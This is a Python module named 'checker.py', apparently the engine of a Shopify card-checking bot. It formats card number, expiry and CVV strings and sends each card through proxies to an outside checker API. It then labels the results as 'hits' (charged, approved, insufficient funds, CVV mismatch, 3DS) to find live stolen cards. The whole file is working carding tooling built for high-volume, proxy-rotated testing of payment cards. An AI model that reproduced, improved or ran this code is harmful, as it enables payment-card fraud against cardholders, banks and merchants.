"""
checker.py — Shopify check engine (mirrors bot logic)
"""
import json, re, time, random, asyncio
import aiohttp
from typing import Optional, Dict, Any

CHECK_TIMEOUT     = 45
CONNECT_TIMEOUT   = 10
SOCK_READ_TIMEOUT = 30

CHARGED_KEYWORDS = ("ORDER_PLACED","ORDER_PAID","PAYMENT_SUCCESSFULL","PAYMENT_CAPTURED","PAYMENT_COMPLETED","PAYMENT_FULFILLED")
SITE_ERROR_KEYWORDS = ("NO_PRODUCTS","PRODUCTS_NOT_FOUND","PAYMENTS_ZONE_NOT_FOUND","INVALID_SHOP","INVALID_PURCHASE_TYPE","REQUIRED_ARTIFACTS_UNAVAILABLE","SUBSCRIPTION_REQUIRED","SITE ERROR","CART FAILED","NO PRODUCT","TIMEOUT","THROTTLED","CAPTCHA_REQUIRED","BOT_BLOCK","HTTP 429","HTTP 503","HTTP 401","HTTP 403","DELIVERY","VAULT","SESSION TOKEN","CHECKOUT ERROR","OUT OF STOCK","UNAVAILABLE","MINIMUM","SECURITY_VIOLATION","LOGIN REQUIRED","SITE REQUIRES LOGIN","SITE_REQUIRED","NO_SITE","SITE_MISSING","INVALID_SITE","APPLICATION NOT FOUND","APP NOT FOUND","404 NOT FOUND","INTERNAL SERVER ERROR","BAD GATEWAY","NOT FOUND")
NSF_KEYWORDS = ("INSUFFICIENT_FUNDS","NSF","INSUFFICIENT FUNDS")
CCN_KEYWORDS = ("INCORRECT_CVC","INVALID_CVC","CVV","WRONG_CVV","INCORRECT_ZIP")
THREE_DS_KEYWORDS = ("3DS","3D_SECURE","3D SECURE","AUTHENTICATION_REQUIRED","OTP_REQUIRED","OTP")
DECLINE_KEYWORDS = ("DECLINED","DECLINE","DO_NOT_HONOR","DO_NOT_HONOUR","DO NOT HONOR","DO NOT HONOUR","GENERIC_DECLINE","GENERIC DECLINE","INVALID_ACCOUNT","INVALID ACCOUNT","INVALID_NUMBER","INVALID NUMBER","INVALID_CARD","INVALID CARD","INCORRECT_NUMBER","INCORRECT NUMBER","CARD_NOT_ACTIVE","CARD NOT ACTIVE","INACTIVE_CARD","INACTIVE CARD","FRAUDULENT","SUSPECTED_FRAUD","FRAUD_SUSPECTED","STOLEN_CARD","STOLEN CARD","LOST_CARD","LOST CARD","PICKUP_CARD","PICKUP CARD","PICK_UP_CARD","PICK UP CARD","CALL_ISSUER","CALL ISSUER","CONTACT_ISSUER","CONTACT ISSUER","EXPIRED_CARD","EXPIRED CARD","CARD_EXPIRED","CARD EXPIRED","RESTRICTED_CARD","RESTRICTED CARD","CARD_NOT_SUPPORTED","CARD NOT SUPPORTED","UNSUPPORTED_CARD","UNSUPPORTED CARD","TRANSACTION_NOT_ALLOWED","TRANSACTION NOT ALLOWED","NOT_PERMITTED","NOT PERMITTED","NOT_ALLOWED","NOT ALLOWED","BIN_BLOCKED","BIN BLOCKED","BLOCKED_CARD","BLOCKED CARD","AUTHENTICATION_FAILED","AUTHENTICATION FAILED","AUTHORIZATION_FAILED","AUTHORIZATION FAILED")
PROXY_ERROR_KEYWORDS = ("PROXY ERROR","CANNOT CONNECT","CONNECTION REFUSED","TUNNEL CONNECTION FAILED","407 PROXY AUTH","PROXY AUTH","PROXY DEAD","FAILED TO CONNECT","CONNECT CALL FAILED")

HIT_CLASSES = ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")

def _san(v, n=200):
    if v is None: return ""
    s = str(v)
    s = re.sub(r"https?://\S+", "[redacted]", s)
    s = re.sub(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?\b", "[redacted]", s)
    return s[:n]

def _b(v): return str(v).strip().lower() == "true"
def _any(u, ks): return any(k in u for k in ks)

def parse_response(text: str, http_status: int = 200) -> Dict[str, Any]:
    raw = text or ""
    up = raw.upper()
    if http_status == 429 or "RATE LIMIT" in up or "TOO MANY" in up:
        return {"cls": "rate_limited", "response": "rate_limited", "amount": 0.0, "currency": "USD", "gateway": "Shopify"}
    if http_status >= 500:
        return {"cls": "site_error", "response": f"HTTP {http_status}", "amount": 0.0, "currency": "USD", "gateway": "Shopify"}

    data = {}
    s = raw.strip()
    if s.startswith(("{", "[")):
        try:
            p = json.loads(s)
            if isinstance(p, list) and p and isinstance(p[0], dict): data = p[0]
            elif isinstance(p, dict): data = p
        except: pass

    chg  = str(data.get("Charged", "False")).strip().lower() == "true"
    apv  = str(data.get("Approved", "False")).strip().lower() == "true"
    msg  = str(data.get("Response", data.get("response", data.get("message", data.get("error", "")))) or "").strip()
    gate = str(data.get("Gate", data.get("Gateway", data.get("gateway", "Shopify"))) or "Shopify").strip()
    pr   = str(data.get("Price", data.get("price", data.get("amount", "0"))) or "0")
    amount, currency, pp = 0.0, "USD", pr.strip().split()
    if pp:
        try: amount = float(pp[0].replace("?", "0").replace("$", ""))
        except: amount = 0.0
        if len(pp) > 1 and pp[1].isalpha(): currency = pp[1].upper()
    if not msg: msg = raw.strip()[:200] or "unknown"

    ru = msg.upper()
    LIVE = {"INSUFFICIENT_FUNDS","NSF","INSUFFICIENT FUNDS","INCORRECT_CVC","INVALID_CVC","WRONG_CVV","INCORRECT_ZIP","OTP_REQUIRED","AUTHENTICATION_REQUIRED","3DS","3D_SECURE","3D SECURE"}

    if chg or _any(ru, CHARGED_KEYWORDS): cls = "charged"
    elif _any(up, PROXY_ERROR_KEYWORDS): cls = "proxy_error"
    elif _any(ru, SITE_ERROR_KEYWORDS): cls = "site_error"
    elif _any(ru, THREE_DS_KEYWORDS): cls = "approved_3ds"
    elif _any(ru, NSF_KEYWORDS): cls = "approved_nsf"
    elif _any(ru, CCN_KEYWORDS): cls = "approved_ccn"
    elif _any(ru, DECLINE_KEYWORDS): cls = "declined"
    elif apv and any(k in ru for k in LIVE): cls = "approved"
    else: cls = "declined"

    return {"cls": cls, "response": msg[:200], "amount": amount, "currency": currency, "gateway": gate}

def is_hit(cls: str) -> bool: return cls in HIT_CLASSES

def normalize_cc(raw: str) -> Optional[str]:
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19): return None
    if len(yy) == 4: yy = yy[2:]
    return f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"

def _proxy_url(p: str) -> str:
    if "://" in p: return p
    parts = p.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

_session: Optional[aiohttp.ClientSession] = None

def _session_get() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(limit=2000, limit_per_host=500, ttl_dns_cache=300, ssl=False),
            timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=SOCK_READ_TIMEOUT),
        )
    return _session

async def close_session():
    global _session
    if _session and not _session.closed: await _session.close()

async def check_cc(cc: str, api: dict, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Run one card through a single API endpoint (with optional proxy)."""
    url = api["url"]
    params = None
    style = (api.get("style") or "params").lower()
    if style == "raw":
        base = url
        sep = "&" if "?" in base else "?"
        parts = [cc]
        if proxy: parts.append(f"proxy={proxy}")
        if api.get("key"): parts.append(f"key={api['key']}")
        url = f"{base}{sep}{'&'.join(parts)}"
    else:
        params = {"cc": cc}
        if proxy: params["proxy"] = proxy
        if api.get("key"): params["key"] = api["key"]

    proxy_url = _proxy_url(proxy) if proxy else None
    start = time.time()
    try:
        async with _session_get().get(url, params=params, proxy=proxy_url, ssl=False) as r:
            text = await r.text(errors="ignore")
            status = r.status
            res = parse_response(text, status)
            res["_rtt"] = round(time.time() - start, 2)
            return res
    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "timeout", "amount": 0.0, "currency": "USD", "gateway": "Shopify"}
    except Exception as e:
        return {"cls": "error", "response": _san(e), "amount": 0.0, "currency": "USD", "gateway": "Shopify"}
